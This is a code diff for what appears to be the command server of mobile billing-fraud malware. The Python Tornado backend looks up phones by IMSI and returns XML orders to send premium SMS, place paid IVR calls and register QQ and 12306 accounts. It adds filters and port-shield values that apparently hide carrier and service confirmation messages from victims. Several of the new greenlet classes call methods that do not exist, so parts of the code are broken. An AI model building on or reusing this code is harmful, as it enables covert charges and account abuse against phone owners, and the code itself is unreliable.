@@ -1,29 +1,35 @@
 # coding: utf-8
 
-import tornado.ioloop
-import tornado.web
 import struct
-import torndb
 import time
 from datetime import datetime
 import json
 import sys
+import re
 import geoip2.database
 import threading
 import random
+import tornado
+import tornado.web
 from log import logger
 
 # private lib
 import config
 import public
 
-from Bastion import _test
+# from Bastion import _test
+
+import pymysql
+pymysql.install_as_MySQLdb()
 import MySQLdb
 from DBUtils.PooledDB import PooledDB
 from tornado import gen
 from tornado.httpclient import AsyncHTTPClient
 from pymongo import MongoClient
-import greenlet
+from gevent.greenlet import Greenlet
+from gevent import monkey
+monkey.patch_all()
+import gevent
 # import requests
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -80,6 +86,18 @@ SMS_REGISTER_CONTENT += "<autofee>1</autofee>"
 SMS_REGISTER_CONTENT += "<feemode>11</feemode>"
 SMS_REGISTER_CONTENT += "</card>"
 SMS_REGISTER_CONTENT += "</wml>"
+
+IVR_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+IVR_CONTENT += "<wml>"
+IVR_CONTENT += "<card>"
+IVR_CONTENT += "<feemode>31</feemode>"
+IVR_CONTENT += "<CallTime>[CallTime]</CallTime>"
+IVR_CONTENT += "<Addr>[spNumber]</Addr>"
+IVR_CONTENT += "<TimeKeys>[TimeKeys]</TimeKeys>"
+IVR_CONTENT += "<SMSKey>[SMSKey]</SMSKey>"
+IVR_CONTENT += "<PortShield>[PortShield]</PortShield>"
+IVR_CONTENT += "</card>"
+IVR_CONTENT += "</wml>"
 
 TEST_CONTENT = ""
 
@@ -154,11 +172,10 @@ class MainHandler(tornado.web.RequestHandler):
         reqInfo["custCode"] = (str(self.request.body[32:47])).strip()
         reqInfo["proCode"] = (str(self.request.body[48:63])).strip()
         reqInfo['svn'] = struct.unpack(
-            "<L", self.request.body[4:7] + "\x00")[0]
+            "<L", self.request.body[4:7] + b"\x00")[0]
         # reqInfo["ip"] = self.request.headers["X-Real-IP"]
         reqInfo["ip"] = self.request.remote_ip
         reqInfo['rspContent'] = ''
-        # insert_req_log(reqInfo)
         _test_imsi_info = check_test_imsi(reqInfo["imsi"])
         if _test_imsi_info == None:
             # process normal user
@@ -171,19 +188,24 @@ class MainHandler(tornado.web.RequestHandler):
             _rsp_content = get_test_response(_test_imsi_info)
             if _test_imsi_info['testStatus'] == 'wxmo':
                 async_report_weixin2nd(_test_imsi_info)
-                threads.append(threading.Thread(
-                    target=delete_wxmo_record(str(reqInfo["imsi"]))))
+                _g_delete_wxmo_record = delete_wxmo_record(
+                    str(reqInfo["imsi"]))
+                _g_delete_wxmo_record.start()
+                # threads.append(threading.Thread(
+                #     target=delete_wxmo_record(str(reqInfo["imsi"]))))
             reqInfo['rspContent'] = _rsp_content
             self.write(_rsp_content)
         # print(reqInfo['rspContent'])
         logger.debug("tcd spent:" +
                      str(int(round(time.time() * 1000)) - _begin_time))
         self.finish()
-        threads.append(threading.Thread(target=insert_req_log(reqInfo)))
-        for t in threads:
-            t.start()
-        time.sleep(10)
-        # print("current has %d threads" % (threading.activeCount() - 1))
+        _g_insert_req_log = insert_req_log(reqInfo)
+        _g_insert_req_log.start()
+        # threads.append(threading.Thread(target=insert_req_log(reqInfo)))
+        # for t in threads:
+        #     t.start()
+        # logger.debug("current has %d threads" % (threading.activeCount() -
+        # 1))
 
 
 def get_imsi_response(_imsi, _threads, _svn):
@@ -213,7 +235,7 @@ def get_imsi_response(_imsi, _threads, _svn):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount,insertTime FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
-    _cur.execute(_sql, [_imsi])
+    _cur.execute(_sql, [str(_imsi)])
     _record_user = _cur.fetchone()
     # print(_record_user)
     ctime = int(time.time())
@@ -230,8 +252,10 @@ def get_imsi_response(_imsi, _threads, _svn):
         if len(str(_record_user['mobile'])) <= 10 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', get_system_parameter_from_db("matchMobile"))
-            _threads.append(threading.Thread(
-                target=async_update_match_count(_imsi)))
+            _g_async_update_match_count = async_update_match_count(_imsi)
+            _g_async_update_match_count.start()
+            # _threads.append(threading.Thread(
+            #     target=async_update_match_count(_imsi)))
         else:
             # normal fee process
             if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
@@ -245,8 +269,11 @@ def get_imsi_response(_imsi, _threads, _svn):
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
                 _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
-                    _threads.append(threading.Thread(
-                        target=insert_register_cmd_log(_record_user, _return)))
+                    _g_insert_register_cmd_log = insert_register_cmd_log(
+                        _record_user, _return)
+                    _g_insert_register_cmd_log.start()
+                    # _threads.append(threading.Thread(
+                    # target=insert_register_cmd_log(_record_user, _return)))
             if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open':
                 _return = get_sms_ad_cmd(_record_user, _threads)
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open':
@@ -303,10 +330,14 @@ def get_sms_ad_cmd(_user, _threads):
 
 
 def async_sms_ad_cmd(_record, _user, _return, _threads):
-    _threads.append(threading.Thread(
-        target=delete_wait_sms_ad(_record)))
-    _threads.append(threading.Thread(
-        target=log_sms_ad_cmd(_record, _user, _return)))
+    _g_delete_wait_sms_ad = delete_wait_sms_ad(_record)
+    _g_delete_wait_sms_ad.start()
+    # _threads.append(threading.Thread(
+    #     target=delete_wait_sms_ad(_record)))
+    _g_log_sms_ad_cmd = log_sms_ad_cmd(_record, _user, _return)
+    _g_log_sms_ad_cmd.start()
+    # _threads.append(threading.Thread(
+    #     target=log_sms_ad_cmd(_record, _user, _return)))
     # _threads.append(threading.Thread(
     #     target=report_sms_ad(_record, _user)))
 
@@ -323,38 +354,6 @@ def async_sms_ad_cmd(_record, _user, _return, _threads):
 #     _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 421,
 #                                    _user["imsi"], _user["mobile"], url, endTime - beginTime])
 #     _dbLog.close()
-
-
-def log_sms_ad_cmd(_record, _user, _return):
-    _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
-    ctime = int(time.time())
-    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 411,
-                                   _user["imsi"], _user["mobile"], _record["targetMobile"], _record["msg"], _record["createTime"], ctime, _record["oriContent"], _return])
-    _dbLog.close()
-
-
-def delete_wait_sms_ad(_record):
-    _dbConfig = poolConfig.connection()
-    _cur = _dbConfig.cursor()
-    _sql = 'delete from wait_send_ads where id=%s '
-    _cur.execute(_sql, [_record['id']])
-    _cur.close()
-    _dbConfig.close()
-
-
-def delete_wxmo_record(imsi):
-    # imsi = filter(str.isdigit, imsi)
-    _dbConfig = poolConfig.connection()
-    _cur = _dbConfig.cursor()
-    _sql = 'delete from test_imsis where imsi = %s '
-    _cur.execute(_sql, [imsi])
-    _sql = 'delete from test_responses where imsi = %s '
-    _cur.execute(_sql, [imsi])
-    _sql = 'update register_user_relations set tryCount=0,lastSendTime=unix_timestamp(now()) where imsi = %s and apid=102 '
-    _cur.execute(_sql, [imsi])
-    _cur.close()
-    _dbConfig.close()
 
 
 def isOpenHour():
@@ -382,13 +381,6 @@ def isOpenSmsRegisterHour(_keyword):
     return _result
 
 
-def async_update_match_count(_imsi):
-    _dbConfig = poolConfig.connection()
-    _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s"
-    _dbConfig.cursor().execute(_sql, [_imsi])
-    _dbConfig.close()
-
-
 def get_cmd(_user, _threads):
     if _user['province'] != None and len(_user['province']) > 0:
         _dbConfig = poolConfig.connection()
@@ -402,12 +394,15 @@ def get_cmd(_user, _threads):
         if _record == None:
             return None
         else:
-            _threads.append(threading.Thread(
-                target=async_update_cmd_fee(_user, _record)))
-            _current_cmd_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace(
-                '[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
-            _threads.append(threading.Thread(
-                target=insert_fee_cmd_log(_user, _record, _current_cmd_content)))
+            _g_async_update_cmd_fee = async_update_cmd_fee(_user, _record)
+            _g_async_update_cmd_fee.start()
+            # _threads.append(threading.Thread(
+            #     target=async_update_cmd_fee(_user, _record)))
+            _current_cmd_content = FEE_CONTENT.replace(
+                '[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
+            _g_insert_fee_cmd_log = insert_fee_cmd_log(
+                _user, _record, _current_cmd_content)
+            _g_insert_fee_cmd_log.start()
             # if _record['spNumber'] == '10658999' and _record['msg'] == 'DH242839':
             #     _threads.append(threading.Thread(
             #         target=sync_score(_user)))
@@ -438,19 +433,22 @@ def get_register_cmd(_user, _threads):
             '[cmd]', 'ZC').replace('[spNumber]', '10690700511').replace('[filter]', '腾讯科技|随时随地|QQ|qq')
         if _user['mobileType'] == "ChinaUnion":
             _result = _result.replace('[portShield]', '10690188')
-            _threads.append(threading.Thread(
-                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
+            _g_async_update_register_cmd_count = async_update_register_cmd_count(
+                _user, 'registerQqCmdCount')
+            _g_async_update_register_cmd_count.start()
         elif _user['mobileType'] == "ChinaMobile":
             _result = _result.replace('[portShield]', '10690508')
-            _threads.append(threading.Thread(
-                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
+            _g_async_update_register_cmd_count = async_update_register_cmd_count(
+                _user, 'registerQqCmdCount')
+            _g_async_update_register_cmd_count.start()
         else:
             _result = None
     elif isOpenSmsRegisterHour('12306') and str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1 and int(get_system_parameter_from_db("12306RegisterLimit")) > 0 and int(_user['register12306CmdCount']) <= (int(get_system_parameter_from_db("12306RegisterLimit")) + TRY_MORE_TIMES) and int(_user['register12306SuccessCount']) < int(get_system_parameter_from_db("12306RegisterLimit")):
         _result = SMS_REGISTER_CONTENT.replace('[cmd]', '999').replace(
             '[spNumber]', '12306').replace('[filter]', '12306|铁路客服').replace('[portShield]', '12306')
-        _threads.append(threading.Thread(
-            target=async_update_register_cmd_count(_user, 'register12306CmdCount')))
+        _g_async_update_register_cmd_count = async_update_register_cmd_count(
+            _user, 'register12306CmdCount')
+        _g_async_update_register_cmd_count.start()
     # elif str(_user['lastRegisterCmdAppIdList']).find(',102,') != -1 and registerTargetConfigs[102]['stateGet'] == 'open':
     #     _result = FEE_CONTENT.replace('[cmd]', '').replace('[spNumber]', '').replace('[filter]', '').replace(
     #         '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
@@ -468,72 +466,282 @@ def get_ivr_cmd(_user, _threads):
         if v['state'] == 'open' and _user['mobileType'] == v['mobileType'] and _user["province"] in v['openProvince'] and _user["city"] not in v['closeCity'] and checkHourRange(v['openHour']):
             ivrDocKey = long(_user['imsi']) * 1000 + v['id']
             ivrDoc = gMongoCli.sms.ivrs.find_one({"_id": ivrDocKey})
+
             if ivrDoc == None:
-                ivrDoc = initialIvrDoc(ivrDocKey, v)
-                a = greenlet(async_insert_ivrDoc, ivrDoc)
-
-                # response = yield tornado.gen.Task(async_insert_ivrDoc,
-                # ivrDoc)
-
-                # insertIvrDoc = asyncMongoInsert(ivrDoc)
-                # insertIvrDoc.start()
-
-                # async_insert_ivrDoc(ivrDoc)
+                _isFree = isIvrFree(v)
+                if _isFree is not True:
+                    ivrDoc = initialIvrDoc(ivrDocKey, v, _isFree)
+                    insertIvrDoc = asyncMongoOperate(ivrDoc, 'insert')
+                    insertIvrDoc.start()
+                _result = proIvrRes(v, _isFree)
+            else:
+                if checkIvrDocOver(ivrDoc, v):
+                    continue
+                _isFree = isIvrFree(v)
+                procExistIvrDoc(ivrDoc, v, _isFree)
+                updateIvrDoc = asyncMongoOperate(ivrDoc, 'update')
+                updateIvrDoc.start()
+                _result = proIvrRes(v, _isFree)
+            if _result != None:
+                _g_insert_ivr_cmd_log = insert_ivr_cmd_log(
+                    _user, _result, v)
+                _g_insert_ivr_cmd_log.start()
+                return _result
     return _result
 
 
-def initialIvrDoc(ivrDocKey, ivrConfig):
-    logger.debug(ivrConfig)
+class insert_ivr_cmd_log(Greenlet):
+
+    def __init__(self, _user, _cmd_info, ivrConfig):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._user = _user
+        self._cmd_info = _cmd_info
+        self.ivrConfig = ivrConfig
+
+    def run(self):
+        self.insertLog(self._user, self._cmd_info, self.ivrConfig)
+
+    def insertLog(self, _user, _cmd_info, ivrConfig):
+        _dbLog = poolLog.connection()
+        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
+        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
+                                       random.randint(0, 9999), 203, _user["imsi"], _user["mobile"], _cmd_info, _user['province'], ivrConfig['spNumber'], ivrConfig['id']])
+        _dbLog.close()
+        return
+
+
+def procExistIvrDoc(ivrDoc, ivrConfig, cmdFree):
     ctime = round(time.time())
-    ivrDoc = {"_id": ivrDocKey}
-    ivrDoc["lastCmdTime"] = long(ctime)
     ivrDoc["expiredTime"] = datetime.utcfromtimestamp(
         long(ctime + 86400 * 60))
-    ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
-    ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
+    ivrDoc["lastCmdIsFree"] = cmdFree
+    if cmdFree is not True:
+        _current_month = int(time.strftime("%m", time.localtime()))
+        _last_cmd_month = int(time.strftime(
+            "%m", time.localtime(ivrDoc["lastCmdTime"])))
+        if _current_month == _last_cmd_month:
+            ivrDoc["currentMonthCmdTotal"] += ivrConfig['price']
+            _current_day = int(time.strftime("%d", time.localtime()))
+            _last_cmd_day = int(time.strftime(
+                "%d", time.localtime(ivrDoc["lastCmdTime"])))
+            if _current_day == _last_cmd_day:
+                ivrDoc["currentDayCmdTotal"] += ivrConfig['price']
+            else:
+                ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
+        else:
+            ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
+            ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
+    ivrDoc["lastCmdTime"] = long(ctime)
     return ivrDoc
 
 
-# class asyncMongoInsert(Greenlet):
-#     """docstring for ClassName"""
-
-#     def __init__(self, arg):
-#         # super(ClassName, self).__init__()
-#         Greenlet.__init__(self)
-#         self.arg = arg
-
-#     def _run(self):
-#         logger.debug("asyncMongoInsert")
-#         gMongoCli.sms.ivrs.insert(arg)
-#         logger.debug("asyncMongoInsert")
-
-
-@gen.coroutine
-def async_insert_ivrDoc(ivrDoc):
-    # yield gMongoCli.sms.ivrs.insert(ivrDoc)
-    gMongoCli.sms.ivrs.insert(ivrDoc)
-    time.sleep(10)
-
-
-def async_update_cmd_fee(_user, _cmd):
-    _time_current = time.time()
-    _total = _cmd['price'] * _cmd['times']
-    if public.is_same_month(_time_current, _user['lastCmdTime']):
-        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0)  + %s , cmdFeeSumMonth = ifnull(cmdFeeSumMonth,0) + %s where imsi = %s '
+def initialIvrDoc(ivrDocKey, ivrConfig, cmdFree):
+    ctime = round(time.time())
+    ivrDoc = {"_id": ivrDocKey}
+    ivrDoc["lastCmdTime"] = long(ctime)
+    # t3 = strptime("2018/3/25 13:36:02", "%Y/%m/%d %H:%M:%S")
+    ivrDoc["expiredTime"] = datetime.utcfromtimestamp(
+        long(ctime + 86400 * 60))
+    ivrDoc["lastCmdIsFree"] = cmdFree
+    if cmdFree:
+        ivrDoc["currentDayCmdTotal"] = 0
+        ivrDoc["currentMonthCmdTotal"] = 0
     else:
-        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0) + %s , cmdFeeSumMonth = %s where imsi = %s '
-    _dbConfig = poolConfig.connection()
-    _dbConfig.cursor().execute(_sql, [_time_current,
-                                      _total, _total, _user['imsi']])
-    _dbConfig.close()
+        ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
+        ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
+    ivrDoc["currentDayFeeTotal"] = 0
+    ivrDoc["currentMonthFeeTotal"] = 0
+    return ivrDoc
 
 
-def async_update_register_cmd_count(_user, _paraName):
-    _sql = 'update imsi_users set ' + _paraName + \
-        ' = ifnull(' + _paraName + ',0)  + 1  where imsi = %s '
-    _dbConfig = poolConfig.connection()
-    _dbConfig.cursor().execute(_sql, [_user['imsi']])
-    _dbConfig.close()
+class asyncMongoOperate(Greenlet):
+    """docstring for ClassName"""
+
+    def __init__(self, doc, act):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self.doc = doc
+        self.act = act
+
+    def run(self):
+        if self.act == 'insert':
+            gMongoCli.sms.ivrs.insert(self.doc)
+        elif self.act == 'update':
+            gMongoCli.sms.ivrs.save(self.doc)
+
+
+def proIvrRes(ivrConfig, isFree):
+    result = None
+    if isFree:
+        result = IVR_CONTENT.replace('[CallTime]', str(getRandomInt(ivrConfig['freeCallTime']))).replace('[spNumber]', ivrConfig['spNumber']).replace(
+            '[TimeKeys]', procIvrTimeKeys(ivrConfig['freeTimeKeys'])).replace('[SMSKey]', ivrConfig['filter']).replace('[PortShield]', ivrConfig['portShield'])
+    else:
+        result = IVR_CONTENT.replace('[CallTime]', str(getRandomInt(ivrConfig['feeCallTime']))).replace('[spNumber]', ivrConfig['spNumber']).replace(
+            '[TimeKeys]', procIvrTimeKeys(ivrConfig['feeTimeKeys'])).replace('[SMSKey]', ivrConfig['filter']).replace('[PortShield]', ivrConfig['portShield'])
+    return result
+
+
+def procIvrTimeKeys(keysStr):
+    result = ""
+    if keysStr != None:
+        result = str(keysStr)
+        mode = re.compile(r'\d+-\d+')
+        _arr = mode.findall(keysStr)
+        for i in _arr:
+            result = result.replace(i, str(getRandomInt(i)), 1)
+    return result
+
+
+def getRandomInt(arrange):
+    if "-" in arrange:
+        _arr = arrange.split('-')
+        return random.randint(int(_arr[0]), int(_arr[1]))
+    else:
+        return arrange
+
+
+def isIvrFree(ivrConfig):
+    if random.randint(0, 99) >= ivrConfig['freeRate']:
+        return False
+    else:
+        return True
+
+
+def checkIvrDocOver(ivrDoc, ivrConfig):
+    if ivrConfig["userFeeDayLimit"] * 100 <= ivrDoc["currentDayFeeTotal"]:
+        return True
+    if ivrConfig["userFeeMonthLimit"] * 100 <= ivrDoc["currentMonthFeeTotal"]:
+        return True
+    if ivrConfig["cmdFeeDayLimit"] * 100 <= ivrDoc["currentDayCmdTotal"]:
+        return True
+    if ivrConfig["cmdFeeMonthLimit"] * 100 <= ivrDoc["currentMonthCmdTotal"]:
+        return True
+    return False
+
+
+class async_update_match_count(Greenlet):
+
+    def __init__(self, _imsi):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._imsi = _imsi
+
+    def run(self):
+        self.asyncUpdateMatchCount(self._imsi)
+
+    def asyncUpdateMatchCount(self, _imsi):
+        _dbConfig = poolConfig.connection()
+        _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s"
+        _dbConfig.cursor().execute(_sql, [_imsi])
+        _dbConfig.close()
+
+
+class async_update_cmd_fee(Greenlet):
+
+    def __init__(self, _user, _cmd):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._user = _user
+        self._cmd = _cmd
+
+    def run(self):
+        self.asyncUpdateCmdFee(self._user, self._cmd)
+
+    def asyncUpdateCmdFee(self, _user, _cmd):
+        _time_current = time.time()
+        _total = _cmd['price'] * _cmd['times']
+        if public.is_same_month(_time_current, _user['lastCmdTime']):
+            _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0)  + %s , cmdFeeSumMonth = ifnull(cmdFeeSumMonth,0) + %s where imsi = %s '
+        else:
+            _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0) + %s , cmdFeeSumMonth = %s where imsi = %s '
+        _dbConfig = poolConfig.connection()
+        _dbConfig.cursor().execute(_sql, [_time_current,
+                                          _total, _total, _user['imsi']])
+        _dbConfig.close()
+
+
+class async_update_register_cmd_count(Greenlet):
+
+    def __init__(self, _user, _paraName):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._user = _user
+        self._paraName = _paraName
+
+    def run(self):
+        self.asyncUpdateRegisterCmdCount(self._user, self._paraName)
+
+    def asyncUpdateRegisterCmdCount(self, _user, _paraName):
+        _sql = 'update imsi_users set ' + _paraName + \
+            ' = ifnull(' + _paraName + ',0)  + 1  where imsi = %s '
+        _dbConfig = poolConfig.connection()
+        _dbConfig.cursor().execute(_sql, [_user['imsi']])
+        _dbConfig.close()
+
+
+class log_sms_ad_cmd(Greenlet):
+
+    def __init__(self, _record, _user, _return):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._record = _record
+        self._user = _user
+        self._return = _return
+
+    def run(self):
+        self.logSmsAdCmd(self._record, self._user, self._return)
+
+    def logSmsAdCmd(self, _record, _user, _return):
+        _dbLog = poolLog.connection()
+        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
+        ctime = int(time.time())
+        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 411,
+                                       _user["imsi"], _user["mobile"], _record["targetMobile"], _record["msg"], _record["createTime"], ctime, _record["oriContent"], _return])
+        _dbLog.close()
+
+
+class delete_wait_sms_ad(Greenlet):
+
+    def __init__(self, _record):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._record = _record
+
+    def run(self):
+        self.deleteWaitSmsAd(self._record)
+
+    def deleteWaitSmsAd(self, _record):
+        _dbConfig = poolConfig.connection()
+        _cur = _dbConfig.cursor()
+        _sql = 'delete from wait_send_ads where id=%s '
+        _cur.execute(_sql, [_record['id']])
+        _cur.close()
+        _dbConfig.close()
+
+
+class delete_wxmo_record(Greenlet):
+
+    def __init__(self, imsi):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self.imsi = imsi
+
+    def run(self):
+        self.deleteWaitSmsAd(self.imsi)
+
+    def deleteWxmoRecord(self, imsi):
+        # imsi = filter(str.isdigit, imsi)
+        _dbConfig = poolConfig.connection()
+        _cur = _dbConfig.cursor()
+        _sql = 'delete from test_imsis where imsi = %s '
+        _cur.execute(_sql, [imsi])
+        _sql = 'delete from test_responses where imsi = %s '
+        _cur.execute(_sql, [imsi])
+        _sql = 'update register_user_relations set tryCount=0,lastSendTime=unix_timestamp(now()) where imsi = %s and apid=102 '
+        _cur.execute(_sql, [imsi])
+        _cur.close()
+        _dbConfig.close()
 
 
 def async_update_register_cmd_mo_ready(_user, _apid):
@@ -554,35 +762,70 @@ def check_user_cmd_fee(_user):
         return False
 
 
-def insert_req_log(_reqInfo):
-    # imsi = filter(str.isdigit, _reqInfo["imsi"])
-    reader = geoip2.database.Reader(
-        config.GLOBAL_SETTINGS['geoip2_db_file_path'])
-    response = reader.city(_reqInfo["ip"])
-    _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
-    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 1, _reqInfo["imsi"], _reqInfo[
-        "ip"], response.subdivisions.most_specific.name, response.city.name, _reqInfo["custCode"], _reqInfo["proCode"], _reqInfo['rspContent'], _reqInfo['svn']])
-    _dbLog.close()
-    return
+class insert_req_log(Greenlet):
+
+    def __init__(self, arg):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self.arg = arg
+
+    def run(self):
+        self.insertReqLog(self.arg)
+        # gMongoCli.sms.ivrs.insert(arg)
+
+    def insertReqLog(self, _reqInfo):
+        # imsi = filter(str.isdigit, _reqInfo["imsi"])
+        reader = geoip2.database.Reader(
+            config.GLOBAL_SETTINGS['geoip2_db_file_path'])
+        response = reader.city(_reqInfo["ip"])
+        _dbLog = poolLog.connection()
+        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
+        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 1, _reqInfo["imsi"], _reqInfo[
+            "ip"], response.subdivisions.most_specific.name, response.city.name, _reqInfo["custCode"], _reqInfo["proCode"], _reqInfo['rspContent'], _reqInfo['svn']])
+        _dbLog.close()
+        return
 
 
-def insert_fee_cmd_log(_user, _fee_cmd, _cmd_info):
-    _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s)'
-    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 201,
-                                   _user["imsi"], _fee_cmd["id"], _fee_cmd["spNumber"], _fee_cmd["msg"], _user["mobile"], _cmd_info, _user["province"]])
-    _dbLog.close()
-    return
+class insert_fee_cmd_log(Greenlet):
+
+    def __init__(self, _user, _fee_cmd, _cmd_info):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._user = _user
+        self._fee_cmd = _fee_cmd
+        self._cmd_info = _cmd_info
+
+    def run(self):
+        self.insertFeeCmdLog(self._user, self._fee_cmd, self._cmd_info)
+        # gMongoCli.sms.ivrs.insert(arg)
+
+    def insertFeeCmdLog(self, _user, _fee_cmd, _cmd_info):
+        _dbLog = poolLog.connection()
+        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s)'
+        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 201,
+                                       _user["imsi"], _fee_cmd["id"], _fee_cmd["spNumber"], _fee_cmd["msg"], _user["mobile"], _cmd_info, _user["province"]])
+        _dbLog.close()
+        return
 
 
-def insert_register_cmd_log(_user, _cmd_info):
-    _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
-    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
-                                   random.randint(0, 9999), 202, _user["imsi"], _user["mobile"], _cmd_info, _user['province']])
-    _dbLog.close()
-    return
+class insert_register_cmd_log(Greenlet):
+
+    def __init__(self, _user, _cmd_info):
+        # super(greenlet, self).__init__()
+        Greenlet.__init__(self)
+        self._user = _user
+        self._cmd_info = _cmd_info
+
+    def run(self):
+        self.insertFeeCmdLog(self._user, self._cmd_info)
+
+    def insertRegisterCmdLog(self, _user, _cmd_info):
+        _dbLog = poolLog.connection()
+        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
+        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
+                                       random.randint(0, 9999), 202, _user["imsi"], _user["mobile"], _cmd_info, _user['province']])
+        _dbLog.close()
+        return
 
 
 def get_system_parameter_from_db(_title):
@@ -599,7 +842,7 @@ def cache_parameter():
     for _t in _recordRsp:
         systemConfigs[_t['title']] = _t['detail']
     tmpIvrConigs = {}
-    _sql = 'SELECT * FROM `ivr_configs` '
+    _sql = "SELECT *,ifnull(closeCity,'') as closeCity,ifnull(freeTimeKeys,'') as freeTimeKeys,ifnull(filter,'') as filter  FROM `ivr_configs` "
     _cur.execute(_sql)
     _recordRsp = _cur.fetchall()
     for _t in _recordRsp:
@@ -685,7 +928,7 @@ def check_test_imsi(_imsi):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
